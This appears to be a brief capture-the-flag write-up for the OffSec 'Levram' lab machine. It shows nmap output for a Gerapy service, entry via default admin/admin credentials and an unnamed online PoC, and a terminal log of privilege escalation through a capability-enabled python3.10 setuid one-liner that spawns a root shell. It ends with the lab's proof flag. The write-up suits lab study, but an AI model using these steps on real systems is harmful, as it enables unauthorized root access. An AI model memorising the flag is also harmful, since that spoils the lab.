---
title: "Levram"
date: 2026-03-17
draft: false
description: "OffSec Levram writeup"
tags: ["linux", "easy", "oscp"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# Levram

## Overview

- **OS:** Linux
- **IP:** 192.168.192.24:8000
- **Difficulty:** Easy
- **Platform:** OffSec
- **OSCP:** Yes
- **Lists:** N/A

### Summary

exploit RCE default admin admin —> privesc with cap.

## Loot

| Loot |  |
| --- | --- |
| **Category** | **Details** |
| Usernames |  |
| Passwords |  |
| Usernames+Passwords |  |
| Hashes |  |
| Service Versions |  |

## Enumeration

## Nmap

```
ORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
8000/tcp open  http    WSGIServer 0.2 (Python 3.10.6)
|_http-cors: GET POST PUT DELETE OPTIONS PATCH
|_http-title: Gerapy
|_http-server-header: WSGIServer/0.2 CPython/3.10.6
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Dirbusting

```

```

## Port 80

## Exploitation

{{< figure src="image 682.png" >}}

admin admin just gets us in 

{{< figure src="image 683.png" >}}

using a poc we found online we are in just like that

{{< figure src="image 684.png" >}}

linpeas showed us that we had cap set

[sudo] password for app:
sudo: 3 incorrect password attempts
app@ubuntu:/tmp$ /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
<c 'import os; os.setuid(0); os.system("/bin/bash")'
root@ubuntu:/tmp# cat /root/proof.txt
cat /root/proof.txt
fddf6d6324241b01d6f2eda82dd68640
root@ubuntu:/tmp#

{{< figure src="image 685.png" >}}
